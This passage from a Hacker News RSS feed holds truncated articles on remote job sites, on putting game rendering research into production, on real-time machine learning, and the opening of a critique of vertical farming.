rel="noopener noreferrer">Idealist</a> is one of the very few remote job sites, that doesn’t list any tech-related jobs at all. Instead, you can find a great selection of fields like health, youth, or legal assistance.</p><h3><span id="Indeed"></span>Indeed<span></span></h3><p>No doubt you have heard about<a href="http://www.indeed.com/" target="_blank" rel="noopener noreferrer"> Indeed</a> before. What many people don’t know: You can also find great online jobs on this platform. All you have to do is insert “remote” in the preferred location box and off you go.</p><h3><span id="Jobrack"></span>Jobrack<span></span></h3><p><a href="https://jobrack.eu/" target="_blank" rel="noopener noreferrer">Jobrack</a> is specialized in finding high-quality employees from Eastern Europe and match them with digital business owners.</p><h3><span id="Jobscribe"></span>Jobscribe<span></span></h3><p>On Jobscribe you can find job openings for tech startups. That can be jobs in development, design or marketing. You can also subscribe to a daily email with new openings.</p><h3><span id="Jobspresso"></span>Jobspresso<span></span></h3><p><a href="https://jobspresso.co/" target="_blank" rel="noopener noreferrer">Jobspresso</a> offers many different kinds of work. You can find tech jobs, like developing or engineering, but also positions in marketing, writing or admin work.</p><h3><span id="Maven"></span>Maven<span></span></h3><p>To use <a href="http://www.maven.co/" target="_blank" rel="noopener noreferrer">Maven</a>’s words, they are a “micro-consulting platform”. Freelancers create a profile with their expertise and hourly rate and can then be hired on a project basis.</p><h3><span id="Peopleforce"></span>Peopleforce<span></span></h3><p><a href="http://www.peopleforce.com/" target="_blank" rel="noopener noreferrer">Peopleforce</a> is an enterprise crowdsourcing platform that is ideal for freelancers who are interested in data entry, data cleaning, research, and tagging jobs.</p><h3><span id="Power_To_Fly"></span>Power To Fly<span></span></h3><p><a href="https://powertofly.com/" target="_blank" rel="noopener noreferrer">Power To Fly</a> is another one of the few remote job sites designed for women only, who are interested in tech positions. They join a talent base, have to go through a vetting and then get matched to a job. After a 2-4 week paid test period they either get the job or not.</p><h3><span id="ProBlogger"></span>ProBlogger<span></span></h3><p><a href="https://problogger.com/" target="_blank" rel="noopener noreferrer">ProBlogger</a> has a job board for everyone passionate about writing. Clients look for people who are interested in producing blog content, consult on their blog, or design one.</p><h3><span id="Proonto"></span>Proonto<span></span></h3><p><a href="https://proonto.com/" target="_blank" rel="noopener noreferrer">Proonto</a> is the perfect place for product and customer service experts. Here businesses are looking for remote assistance to help their e-commerce shoppers.</p><h3><span id="ProZ"></span>ProZ<span></span></h3><p><a href="http://www.proz.com/" target="_blank" rel="noopener noreferrer">ProZ </a>is probably the world’s largest translator network. It provides a massive choice of translation work for freelancers and is often the first address for professional translators.</p><h3><span id="Remote_co"></span>Remote.co<span></span></h3><p><a href="https://remote.co/" target="_blank" rel="noopener noreferrer">Remote.co</a> is one of the most popular remote job sites. Therefore, you can also find an open position with big companies, like Amazon or TED. More than just the job search this platform offers you advice and tips about remote work in general.</p><h3><span id="Remote_Jobs"></span>Remote Jobs<span></span></h3><p>Remote Jobs offer openings the IT field, which are fulltime and 100% remote. The quick search makes it easy to find appropriate jobs and the weekly newsletter keeps you updated.</p><h3><span id="Remote_OK"></span>Remote OK<span></span></h3><p><a href="https://remoteok.io/" target="_blank" rel="noopener noreferrer">Remote OK</a> gives you the option to search by pay scale and see a list of companies, who employ remote professionals. You have a massive choice of tech-related jobs, as well as all kinds of non-tech jobs, such as writing, sales, social media management, or human resource.</p><h3><span id="Remote_Tech_Work"></span>Remote Tech Work<span></span></h3><p>As the name states clearly, <a href="http://remotetechwork.com/" target="_blank" rel="noopener noreferrer">Remote Tech Work </a>provides location-independent jobs for developers, support engineers, testers, and designers.</p><h3><span id="Remote_Working"></span>Remote Working<span></span></h3><p>Most of the jobs on<a href="http://www.remoteworking.co/" target="_blank" rel="noopener noreferrer"> Remote Working</a> are tech-related. It also allows you to filter for part-time, freelancer or internship positions.</p><h3><span id="Remotive"></span>Remotive<span></span></h3><p><a href="https://remotive.io/" target="_blank" rel="noopener noreferrer">Remotive</a> is another website that provides work-from-anywhere jobs in many different areas. If you want to they send you a newsletter every two weeks with their new job listings.</p><h3><span id="Ruby_Now"></span>Ruby Now<span></span></h3><p>As the name suggests, <a href="https://jobs.rubynow.com/" target="_blank" rel="noopener noreferrer">Ruby Now</a> connects employers with ruby specialists. They have more than 5,000 job openings and provide additional information about ruby-related topics.</p><p><img loading="lazy" src="https://www.digitalnomadsoul.com/wp-content/uploads/2017/08/Remote-Job-Sites-3.jpg" alt="Remote Job Sites, Digital Nomad, Online Job, Make Money Online, Location-Independent Job, Job Search, Hire Remote Worker, Freelancer" width="503" height="335" srcset="https://www.digitalnomadsoul.com/wp-content/uploads/2017/08/Remote-Job-Sites-3.jpg 1024w, https://www.digitalnomadsoul.com/wp-content/uploads/2017/08/Remote-Job-Sites-3-300x200.jpg 300w, https://www.digitalnomadsoul.com/wp-content/uploads/2017/08/Remote-Job-Sites-3-768x512.jpg 768w" sizes="(max-width: 503px) 100vw, 503px" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20503%20335'%3E%3C/svg%3E" data-lazy-srcset="https://www.digitalnomadsoul.com/wp-content/uploads/2017/08/Remote-Job-Sites-3.jpg 1024w, https://www.digitalnomadsoul.com/wp-content/uploads/2017/08/Remote-Job-Sites-3-300x200.jpg 300w, https://www.digitalnomadsoul.com/wp-content/uploads/2017/08/Remote-Job-Sites-3-768x512.jpg 768w" data-lazy-src="https://www.digitalnomadsoul.com/wp-content/uploads/2017/08/Remote-Job-Sites-3.jpg"></p><h3><span id="Stack_Overflow_Careers"></span>Stack Overflow Careers<span></span></h3><p><a href="https://stackoverflow.com/jobs" target="_blank" rel="noopener noreferrer">Stack Overflow Careers </a>focusses on programmers. You can explore remote jobs, that are based in a certain area and look up career salaries.</p><h3><span id="Staff"></span>Staff<span></span></h3><p><a href="https://staff.com/" target="_blank" rel="noopener noreferrer">Staff</a> may be one of the smaller remote job sites, but it is 100% free. Means neither job seekers, not employers have to pay to connect.</p><h3><span id="Skip_The_Drive"></span>Skip The Drive<span></span></h3><p><a href="https://www.skipthedrive.com/" target="_blank" rel="noopener noreferrer">Skip The Drive</a> offers more than just the usual job openings. It also allows you to track your applications, get work-from-home tips and find the best companies for remote work. In …</p></div></div></div></div></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.digitalnomadsoul.com/best-remote-job-sites/">https://www.digitalnomadsoul.com/best-remote-job-sites/</a></em></p>]]>
            </description>
            <link>https://www.digitalnomadsoul.com/best-remote-job-sites/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25557608</guid>
            <pubDate>Mon, 28 Dec 2020 08:15:42 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why are video games graphics challenging? Productionizing rendering algorithms]]>
            </title>
            <description>
<![CDATA[
Score 296 | Comments 83 (<a href="https://news.ycombinator.com/item?id=25557431">thread link</a>) | @bartwr
<br/>
December 27, 2020 | https://bartwronski.com/2020/12/27/why-are-video-games-graphics-still-a-challenge-productionizing-rendering-algorithms/ | <a href="https://web.archive.org/web/*/https://bartwronski.com/2020/12/27/why-are-video-games-graphics-still-a-challenge-productionizing-rendering-algorithms/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
						
<h2>Intro</h2>



<p>This post will cover challenges and aspects of production to consider when creating new rendering / graphics techniques and algorithms – especially in the context of <strong>applied research for real time rendering</strong>. I will base this on my personal experiences, working on <strong>Witcher 2, Assassin’s Creed 4: Black Flag, Far Cry 4, and God of War</strong>.</p>



<p>Many of those challenges are easily ignored – they are <strong>real problems in production</strong>, but not necessarily there only if you only read about those techniques, or if you work on pure research, writing papers, or create tech demos.</p>



<p>I have seen statements like “why is this brilliant research technique X not used in production?” both from gamers, but also from my colleagues with academic background. And there are always some good reasons!</p>



<p>The post is also inspired by <a href="https://twitter.com/bartwronsk/status/1327509557015310336">my joke tweet</a> from a while ago about appearing smart and mature as a graphics programmer by “dismissing” most of the rendering techniques – that they are not going to work on foliage. 🙂&nbsp;And yes, I will come back to vegetation rendering a few times in this post.</p>



<p>I tend to think of this topic as well when I hear discussions about how “photogrammetry, raytracing, neural rendering, [insert any other new how topic] will be a universal answer to rendering and replace everything!”. Spoiler alert: not gonna happen (soon).</p>



<h2>Target audience</h2>



<p>Target audience of my post are:</p>



<ul><li>Students in computer graphics and applied researchers,</li><li>Rendering engineers, especially ones earlier in their career – who haven’t built their intuition yet,</li><li>Tech artists and art leads / producers,</li><li>Technical directors and decision makers without background in graphics,</li><li>Hardware engineers and architects working on anything GPU or graphics related (and curious what makes it complicated to use new HW features),</li><li>People who are excited and care about game graphics (or real time graphics in general) and would like to understand a bit “how sausages are made”. Some concepts might be too technical and too much jargon, but then feel free to skip those.</li></ul>



<p>Note that I didn’t place “pure” academic researchers in the above list – as I don’t think that pure research should be considering too many obstacles. Role of the fundamental research is inspiration and creating theory that can be later productionized by people who are experts in productionization.</p>



<p>But if you are a pure researcher and somehow got here, I’ll be happy if you’re interested in what kinds of problems might be on the long way from idea or paper to a product (and <strong>why most new genuinely good research will never find its place in products</strong>).</p>



<h2>How to interpret the guide</h2>



<p>Very important note – <strong>none </strong>of the “obstacles” I am going to describe <strong>are deal breakers</strong>.</p>



<p>Far from it – most successful tech that became state of the art violates many of those constraints! It simply means that those are challenges that will need to be overcome in some way – manual workarounds, feature exclusivity, ignoring the problems, or applying them only in specific cases.</p>



<p>I am going to describe first the <strong>use-cases</strong> – potential uses of the technology and how those impact potential requirements and constraints.</p>



<h2>Use case</h2>



<p>The categories of “use cases” deserve some explanation and description of “severity” of their constraints.</p>



<h3>Tech demo&nbsp;</h3>



<p>Tech demo is the easiest category. If your whole product is a <strong>demonstration of a given technique </strong>(whether for benchmarking, showing off some new research, artistic demoscene), most of the considerations go away.</p>



<p>You can actually retrofit everything: from the demo concept, art itself, camera trajectory to show off the technology the best and avoid any problems.</p>



<p>The main considerations will be around performance (a choppy tech demo can be seen as a tech failure) and working very closely with artists able to show it off.</p>



<p>The rest? Hack away, write one-off code – just don’t have expectations that turning a tech demo into a production ready feature is simple or easy (it’s more like the 99% of work remaining).</p>



<h3>Special level / one-off</h3>



<p>The next level “up” in the difficulty is creating some <strong>special features that are one-off</strong>. It can be some visual special effect happening in a single scene, game intro, or a single level that is different from the other ones. In this case, a feature doesn’t need to be very “robust”, and often replaces many others.</p>



<p>An example could be lighting in the jungle levels in Assassin’s Creed 4: Black Flag that I worked on.&nbsp;</p>



<div><figure><img src="https://lh3.googleusercontent.com/51bdx_bCzH7HBQ7NjppuafWVspC1jLwJ4OwbTLwYq1DLDnnOlxNGZtXby8mLGdqhnjC00WyxAfq1L3d8EIOatPflkT4phHF4Xq2WxOeUSlRCymYNEPQW3WiOeywiz8edAD592PNh" alt="" width="458" height="610"><figcaption>Source: Assassin’s Creed 4: Black Flag promo art. Notice the caustics-like lightshafts that were key rendering feature in jungle levels – and allowed us to save a lot on the shadows rendering!</figcaption></figure></div>



<p>Jungles were “cut off” from the rest of the open world by special streaming corridors and we completely replaced the whole lighting in them! Instead of relying on tree shadow maps and global lighting, we created <strong>fake “caustics”</strong> that looked much softer and played very nicely with our volumetric lighting / atmospherics system. They not only looked better, but also were much faster – obviously worked only because of those special conditions.</p>



<h3>Cinematics</h3>



<p>A slightly more demanding type of feature is cinematic-only one. Cinematics are a bit different as they can be very strictly controlled by cinematic artists and <strong>most of their aspects like lighting, character placement, or animations are faked</strong> – just like in regular cinema! Cinematics often feature fast camera cuts (useful to hide any transitions/popping) and have more computational budget due to more predictable nature (and even in 60fps console games rendered in 30fps).</p>



<div><figure><img src="https://lh3.googleusercontent.com/g3SLk16AtqBNz6TfdSXtNhMDqo6sPXIrwQUQWEjGas1fZ3vYUVLWf_vC5or3-Gen-0Z1WRlt9M46eDiBv5b1tSmU_A0aqKPbq2zR-iJ5IerV42EpuGfrgdTtJVygjhpuQ7R1_-0C" alt=""><figcaption>Witcher 2 cinematic featuring higher character LODs, nice realistic large radius bokeh and custom lighting – but notice how few objects to render are there!</figcaption></figure></div>



<h3>Regular rendering feature</h3>



<p>“Regular” features – lighting, particles, geometry rendering – are the <strong>hardest category</strong>. They need to be either very easy to implement (most of the obstacles / problems solved easily), provide huge benefits surpassing state of the art by far to facilitate the adoption pain, or have some very excited team pushing for it (never underestimate the drive of engineers or artists that really want to see something happen!).</p>



<p>Most of my post will focus on those.&nbsp;</p>



<h3>Key / differentiating feature</h3>



<p>Paradoxically, if something is a key or differentiating feature, this can alleviate many of the difficulties. Let’s take VR – there stereo, performance (low latency), and perfect AA with no smudging (so rather forget about TAA), are <strong>THE features and absolutely core to the experience</strong>. This means that you can completely ignore for example rendering foliage or some animations that would look uncannily – as being immersed and the VR experience of being there are much more important!</p>



<h2>Feature compatibility</h2>



<p>Let’s have a look at compatibility of a newly developed feature with some other common “features” (the distinction between “features”, and the next large section “pipeline” is fuzzy).</p>



<p>Features are not the most important of challenges – arguably the category I’m going to cover at the end (the “process”) is. But those are fun and easy to look at!&nbsp;</p>



<h3>Dense geometry</h3>



<p>Dense geometry like <strong>foliage </strong>– a “feature” that inspired this post – is an enemy of most rendering algorithms.</p>



<p>The main problem is that with very dense geometry (lots of overlapping and small triangles), many “optimizations” and assumptions become impossible.</p>



<p>Early Z and occlusion culling? Very hard.&nbsp;</p>



<p>Decoupling surfaces from volumes? Very hard.</p>



<p>Storing information per unique surface parametrization? Close to impossible.</p>



<p>Amount of vertices to animate and pixels to shade? Huge, shaders need simplification!</p>



<div><figure><img src="https://lh4.googleusercontent.com/P3m7eTgVGodadf6TSd7Ca4Th8wedlR3AEr0wghmVTz0klnfU2hUTq4K1jRdhLljGMRQKgiG-pq02Ayc5Dtllma_jLOF60rtSCx0jID78CYen8cyAW3z2N_bCPYh7KvemZ2k8bWIX" alt=""><figcaption>Witcher 2 foliage – that density! Still IMO one of the best forests in any game.</figcaption></figure></div>



<p>Dense geometry through which you can see (like grass blades) is incompatible with many techniques, for example lightmapping (storing a precomputed lighting per every grass blade texel would be very costly).</p>



<p>If a game has a tree here and there or is placed in a city, this might not be a problem. But for any “natural” environment, a big chunk of the productionization of any feature is going to be combining it to coexist well with foliage.</p>



<h3>Alpha testing</h3>



<p>Alpha testing is an extension of the above, as it disables even more hardware features / optimizations.</p>



<p>Alpha testing is a technique, when a pixel evaluates “alpha” value from a texture or pixel shader computations, and <strong>based on some fixed threshold, doesn’t render/write it</strong>.</p>



<p>It is much faster than alpha blending, but for example disables early z writes (early z tests are ok), and requires raytracing hit shaders and reading a texture to decide if a texel was opaque or not.</p>



<p>It also makes antialiasing very challenging (forget about regular MSAA, you have to emulate alpha to coverage…).</p>



<p>For a description and great visual explanation of some problems, see this blog post of <a href="https://bgolus.medium.com/anti-aliased-alpha-test-the-esoteric-alpha-to-coverage-8b177335ae4f">Ben Golus</a>.</p>



<h3>Animation – skeletal</h3>



<p>Most animators work with “skeletal animations”. <strong>Creating rigs, skinning meshes, animating skeletons</strong>. When you create a new technique for rendering meshes that relies on some heavy precomputations, would animators be able to “deform” it? Would they be able to plug it into a complicated animation blending system? How does it fit in their workflow?</p>



<p>Note that it can also mean rigid deformations, like a rotating wheel – it’s much cheaper to render complicated objects as a skinned whole, than splitting them.</p>



<p>And animation is a must, cannot be an afterthought in any commercial project.</p>



<figure><img src="https://lh5.googleusercontent.com/WBPNVuhqPnwXvUjbrp1UpzraK24bQT3VrXJgslGPgwWqC2M__So3SISqaiBrNytVVvy7HqVV6V64o1VFsAM5NxbzOEn5lwll6ayTOd49M5oC2rF9AAHk5ryI--vv8lqe2rCPWBoU" alt=""><figcaption>Witcher 2 trebuchets were not people, but also had “skeletons” and “bones” and were using skeletal animations!</figcaption></figure>



<h3>Animation – procedural and non-rigid</h3>



<p>The next category of animations are “procedural” and non-rigid. Procedural animations are useful for any animation that is “endless”, relatively simple, and shouldn’t loop too visibly. The most common example is <strong>leaf shimmer and branch movement</strong>.</p>



<p>S…</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://bartwronski.com/2020/12/27/why-are-video-games-graphics-still-a-challenge-productionizing-rendering-algorithms/">https://bartwronski.com/2020/12/27/why-are-video-games-graphics-still-a-challenge-productionizing-rendering-algorithms/</a></em></p>]]>
            </description>
            <link>https://bartwronski.com/2020/12/27/why-are-video-games-graphics-still-a-challenge-productionizing-rendering-algorithms/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25557431</guid>
            <pubDate>Mon, 28 Dec 2020 07:26:51 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Machine learning is going real-time]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25557412">thread link</a>) | @yoquan
<br/>
December 27, 2020 | https://huyenchip.com/2020/12/27/real-time-machine-learning.html | <a href="https://web.archive.org/web/*/https://huyenchip.com/2020/12/27/real-time-machine-learning.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
    <p>After talking to machine learning and infrastructure engineers at major Internet companies across the US, Europe, and China, I noticed two groups of companies. One group has made significant investments (hundreds of millions of dollars) into infrastructure to allow real-time machine learning and has already seen returns on their investments. Another group still wonders if there’s value in real-time ML.</p>

<p>There seems to be little consensus on what real-time ML means, and there hasn’t been a lot of in-depth discussion on how it’s done in the industry. In this post, I want to share what I’ve learned after talking to about a dozen companies that are doing it.</p>

<p>There are two levels of real-time machine learning that I’ll go over in this post.</p>
<ul>
  <li>Level 1: Your ML system makes predictions in real-time (online predictions).</li>
  <li>Level 2: Your system can incorporate new data and update your model in real-time (online learning).</li>
</ul>

<p>I use “model” to refer to the machine learning model and “system” to refer to the infrastructure around it, including data pipeline and monitoring systems.</p>

<hr>
<p><b>Table of contents</b><br>
…. <a href="#online_predictions">Level 1: Online predictions - your system can make predictions in real-time</a><br>
…….. <a href="#online_predictions_use_cases">Use cases</a><br>
………… <a href="#problems_batch_predictions">Problems with batch predictions</a><br>
…….. <a href="#online_predictions_solutions">Solutions</a><br>
………… <a href="#fast_inference">Fast inference</a><br>
………… <a href="#stream_pipeline">Real-time pipeline</a><br>
……………. <a href="#stream_processing_vs_batch_processing">Stream processing vs. batch processing</a><br>
……………. <a href="#event_driven_vs_request_driven">Event-driven vs. request-driven</a><br>
…….. <a href="#online_predictions_challenges">Challenges</a><br>
…. <a href="#online_learning">Level 2: Online learning - your system can incorporate new data and update in real-time</a><br>
…….. <a href="#online_learning_definition">Defining “online learning”</a><br>
…….. <a href="#online_learning_use_cases">Use case</a><br>
…….. <a href="#online_learning_solutions">Solutions</a><br>
…….. <a href="#online_learning_challenges">Challenges</a><br>
………… <a href="#online_learning_theoretical_challenges">Theoretical</a><br>
………… <a href="#online_learning_practical_challenges">Practical</a><br>
…. <a href="#mlops_china_vs_us">The MLOps race between the US and China</a><br>
…. <a href="#conclusion">Conclusion</a><br></p>

<hr>

<h2 id="online_predictions">Level 1: Online predictions - your system can make predictions in real-time</h2>
<p><em><b>Real-time</b> here is defined to be in the order of milliseconds to seconds.</em></p>

<h3 id="online_predictions_use_cases">Use cases</h3>
<p>Latency matters, especially for user-facing applications. In 2009, Google’s experiments demonstrated that <a href="https://services.google.com/fh/files/blogs/google_delayexp.pdf">increasing web search latency 100 to 400 ms reduces the daily number of searches per user by 0.2% to 0.6%</a>. In 2019, <a href="https://blog.acolyer.org/2019/10/07/150-successful-machine-learning-models/">Booking.com found that an increase of 30% in latency cost about 0.5% in conversion rates — “a relevant cost for our business.”</a></p>

<p>No matter how great your ML models are, if they take just milliseconds too long to make predictions, users are going to click on something else.</p>

<h4 id="problems_batch_predictions">Problems with batch predictions</h4>
<p>One non-solution is to avoid making predictions online. You can generate predictions in batch offline, store them (e.g. in SQL tables), and pull out pre-computed predictions when needed.</p>

<p>This can work when the input space is finite – you know exactly how many possible inputs to make predictions for. One example is when you need to generate movie recommendations for your users – you know exactly how many users there are. So you predict a set of recommendations for each user periodically, such as every few hours.</p>

<p>To make their user input space finite, many apps make their users choose from categories instead of entering wild queries. For example, if you go to TripAdvisor, you first have to pick a predefined metropolis area instead of being able to enter just any location.</p>

<p>This approach has many limitations. TripAdvisor results are okay within their predefined categories, such as <b>“Restaurants”</b> in <b>“San Francisco”</b>, but are pretty bad when you try to enter wild queries like <b>“high rating Thai restaurants in Hayes Valley”</b>.</p>

<center>
<figure>
<img alt="MLOps over time" src="https://huyenchip.com/assets/pics/real-time-ml/1_tripadvisor.png">
</figure>
</center>

<p>Limitations caused by batch predictions exist even in more technologically progressive companies like Netflix. Say, you’ve been watching a lot of horrors lately, so when you first log into Netflix, horror movies dominate recommendations. But you’re feeling bright today so you search “comedy” and start browsing the comedy category. Netflix should learn and show you more comedy in your list of their recommendations, right? But it can’t update the list until the next time batch recommendations are generated.</p>

<p>In the two examples above, batch predictions lead to decreases in user experience (which is tightly coupled with user engagement/retention), not catastrophic failures. Other examples are ad ranking, Twitter’s trending hashtag ranking, Facebook’s newsfeed ranking, estimating time of arrival, etc.</p>

<p>There are also many applications that, without online predictions, would lead to catastrophic failures or just wouldn’t work. Examples include high frequency trading, autonomous vehicles, voice assistants, unlocking your phones using face/fingerprints, fall detection for elderly care, fraud detection, etc. Being able to detect a fraudulent transaction that happened 3 hours ago is still better than not detecting it at all, but being able to detect it in real-time can prevent it from going through.</p>

<p>Switching from batch predictions to real-time predictions allows you to use dynamic features to make more relevant predictions. Static features are information that changes slowly or rarely – age, gender, job, neighborhood, etc. Dynamic features are features based on what’s happening right now – what you’re watching, what you’ve just liked, etc. Knowing a user’s interests right now will allow your systems to make recommendations much more relevant to them.</p>

<center>
<figure>
<img alt="MLOps over time" src="https://huyenchip.com/assets/pics/real-time-ml/2_google.png">
</figure>
</center>

<h3 id="online_predictions_solutions">Solutions</h3>
<p>For your system to be able to make online predictions, it has to have two components:</p>

<ol>
  <li>Fast inference: model that can make predictions in the order of milliseconds</li>
  <li>Real-time pipeline: a pipeline that can process data, input it into model, and return a prediction in real-time</li>
</ol>

<h4 id="fast_inference">Fast inference</h4>
<p>When a model is too big and taking too long to make predictions, there are three approaches:</p>

<p><b>1. Make models faster (inference optimization)</b></p>

<p>E.g. fusing operations, distributing computations, memory footprint optimization, writing high performance kernels targeting specific hardwares, etc.</p>

<p><b>2. Make models smaller (model compression)</b></p>

<p>Originally, this family of technique is to make models smaller to make them fit on edge devices. Making models smaller often makes them run faster. The most common, general technique for model compression is quantization, e.g. using 16-bit floats (half precision) or 8-bit integers (fixed-point) instead of 32-bit floats (full precision) to represent your model weights. In the extreme case, some have attempted 1-bit representation (binary weight neural networks), e.g. <a href="https://arxiv.org/abs/1511.00363">BinaryConnect</a> and <a href="https://arxiv.org/abs/1603.05279">Xnor-Net</a>. The authors of Xnor-Net spun off Xnor.ai, a startup focused on model compression which was <a href="https://www.geekwire.com/2020/exclusive-apple-acquires-xnor-ai-edge-ai-spin-paul-allens-ai2-price-200m-range/">acquired by Apple for a reported $200M</a>.</p>

<p>Another popular technique is <a href="https://arxiv.org/abs/1503.02531">knowledge distillation</a> – a small model (student) is trained to mimic a larger model or an ensemble of models (teacher). Even though the student is often trained with a pre-trained teacher, both may also be trained at the same time. One example of a distilled network used in production is <a href="https://arxiv.org/abs/1910.01108"><strong>DistilBERT</strong></a>, which reduces the size of a BERT model by 40%, while retaining 97% of its language understanding capabilities and being 60% faster.</p>

<p>Other techniques include pruning (finding parameters least useful to predictions and setting them to 0) and low-rank factorization (replacing the over-parametric convolution filters with compact blocks to both reduce the number of parameters and increase speed). See <strong><a href="https://arxiv.org/abs/1710.09282">A Survey of Model Compression and Acceleration for Deep Neural Networks</a></strong> (Cheng et al.. 2017) for a detailed analysis.</p>

<p>The number of research papers on model compression is growing. Off-the-shelf utilities are proliferating. Awesome Open Source has a list of <a href="https://awesomeopensource.com/projects/model-compression"><strong>The Top 40 Model Compression Open Source Projects</strong></a>.</p>

<p><b>3. Make hardware faster</b></p>

<p>This is another research area that is booming. Big companies and startups alike are in a race to develop hardware that allows large ML models to do inference, even training, faster both on the cloud and especially on devices. IDC forecasts that by 2020, the combination of edge and mobile devices doing inferencing will <a href="https://www.arm.com/-/media/global/solutions/artificial-intelligence/ai-ml-on-cpu-whitepaper.pdf?revision=17a2b30b-0f5a-4a42-8681-3d9f3f94e513">total 3.7 billion units, with a further 116 million units doing training</a>.</p>

<h4 id="stream_pipeline">Real-time pipeline</h4>
<p>Suppose you have a ride sharing app and want to detect fraudulent transactions e.g. payments using stolen credit cards. When the true credit owner discovers unauthorized payments, they’ll dispute with their bank and you’ll have to refund the charges. To maximize profits, fraudsters might call multiple rides either in succession or from multiple accounts. In 2019, merchants estimate fraudulent transactions account for an average of <a href="https://network.americanexpress.com/globalnetwork/dam/jcr:09c34553-b4a2-43ca-bf3e-47cbc911ea51/American%20Express%202019%20Digital%20Payments%20Survey_Insights%20Paper.pdf">27% of their annual online sales</a>. The longer it takes for you to detect the stolen credit card, the more money you’ll lose.</p>

<p>To detect whether a transaction is fraudulent, looking at that transaction alone isn’t enough. You need to at least look into the recent history of the user involved in that transaction, their recent trips and activities in-app, the credit card’s recent transactions, and other transactions happening around the same time.</p>

<p>To quickly access these types of information, you want to keep as much of them in-memory as possible. Every time an event you care about happens – a user choosing a location, booking a trip, contacting a driver, canceling a trip, adding a credit card, removing a credit card, etc. – information about that event goes into your in-memory storage. It stays there for as long as they are useful (usually in order of days) then either goes into permanent storage (e.g. S3) or is discarded. The most common tool for this is <a href="https://github.com/apache/kafka">Apache Kafka</a>, with alternatives such as Amazon Kinesis. Kafka is a stream storage: it stores data as it streams.</p>

<p>Streaming data is different from static data – data that already exists somewhere in its entirety, such as CSV files. When reading from CSV files, you know when the job is finished. Streams of data never finish.</p>

<p>Once you’ve had a way to manage streaming data, you want to extract features to input into your ML models. On top of features from streaming data, you might also need features from static data (when was this account created, what’s the user’s rating, etc.). You need a tool that allows you to process streaming data as well as static data and join …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://huyenchip.com/2020/12/27/real-time-machine-learning.html">https://huyenchip.com/2020/12/27/real-time-machine-learning.html</a></em></p>]]>
            </description>
            <link>https://huyenchip.com/2020/12/27/real-time-machine-learning.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25557412</guid>
            <pubDate>Mon, 28 Dec 2020 07:21:53 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[No, Vertical Farms Won’t Feed the World]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25557407">thread link</a>) | @hannob
<br/>
December 27, 2020 | https://globalecoguy.org/no-vertical-farms-wont-feed-the-world-5313e3e961c0 | <a href="https://web.archive.org/web/*/https://globalecoguy.org/no-vertical-farms-wont-feed-the-world-5313e3e961c0">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section><div><figure><div role="button" tabindex="0"><div><p><img alt="Image for post" src="https://miro.medium.com/max/8574/1*LxTo93oCvOVo9Q-YCrcBpg.jpeg" width="4287" height="1673" srcset="https://miro.medium.com/max/552/1*LxTo93oCvOVo9Q-YCrcBpg.jpeg 276w, https://miro.medium.com/max/1104/1*LxTo93oCvOVo9Q-YCrcBpg.jpeg 552w, https://miro.medium.com/max/1280/1*LxTo93oCvOVo9Q-YCrcBpg.jpeg 640w, https://miro.medium.com/max/1456/1*LxTo93oCvOVo9Q-YCrcBpg.jpeg 728w, https://miro.medium.com/max/1632/1*LxTo93oCvOVo9Q-YCrcBpg.jpeg 816w, https://miro.medium.com/max/1808/1*LxTo93oCvOVo9Q-YCrcBpg.jpeg 904w, https://miro.medium.com/max/1984/1*LxTo93oCvOVo9Q-YCrcBpg.jpeg 992w, https://miro.medium.com/max/2160/1*LxTo93oCvOVo9Q-YCrcBpg.jpeg 1080w, https://miro.medium.com/max/2700/1*LxTo93oCvOVo9Q-YCrcBpg.jpeg 1350w, https://miro.medium.com/max/3240/1*LxTo93oCvOVo9Q-YCrcBpg.jpeg 1620w, https://miro.medium.com/max/3780/1*LxTo93oCvOVo9Q-YCrcBpg.jpeg 1890w, https://miro.medium.com/max/4320/1*LxTo93oCvOVo9Q-YCrcBpg.jpeg 2160w, https://miro.medium.com/max/4800/1*LxTo93oCvOVo9Q-YCrcBpg.jpeg 2400w" sizes="100vw" data-old-src="https://miro.medium.com/max/60/1*LxTo93oCvOVo9Q-YCrcBpg.jpeg?q=20"></p></div></div><figcaption>Lettuce grown in my garden. Photograph © 2016 Jonathan Foley.</figcaption></figure></div><div><div><h2 id="f47c">While they are well-intentioned, new indoor “farms” won’t help feed the world or reduce the environmental impacts of agriculture. We would be better to focus our efforts elsewhere.</h2><div><div><div><div><a href="https://globalecoguy.medium.com/?source=post_page-----5313e3e961c0--------------------------------" rel="noopener"><div><p><img alt="Jonathan Foley" src="https://miro.medium.com/fit/c/96/96/1*9wBAcVM1jqF9OWCjCOGiuA.jpeg" width="48" height="48"></p></div></a></div></div></div></div></div></div></section><section><div><div><p id="bd54"><span>W</span>e’re beginning to see a new fad in agriculture — so-called “vertical farms” that grow food <em>indoors </em>with energy-intensive, artificial life support systems.</p><p id="498f">In the last few years, a number of tech companies have designed “farms” that utilize artificial lights, heaters, water pumps, and computer controls to grow crops inside. These systems glow with a fantastic magenta light — from LEDs that are specially tuned to provide optimal light for photosynthesis — often with stacked trays of plants, one on top of the other. Some of this technology is new, especially the LEDs, although pot growers have used tools like this for years.</p><p id="db29">Some of the more notable efforts to build indoor “farms” include <a href="http://www.freightfarms.com/" rel="noopener">Freight Farms</a> in Boston. And there is a group at MIT that is trying to create new high-tech platforms for growing food inside, including “<a href="http://openag.media.mit.edu/hardware/" rel="noopener">food computers</a>”. These folks are very smart, and have done a lot to perfect the technology.</p><p id="47bb">At first blush, these “farms” sound 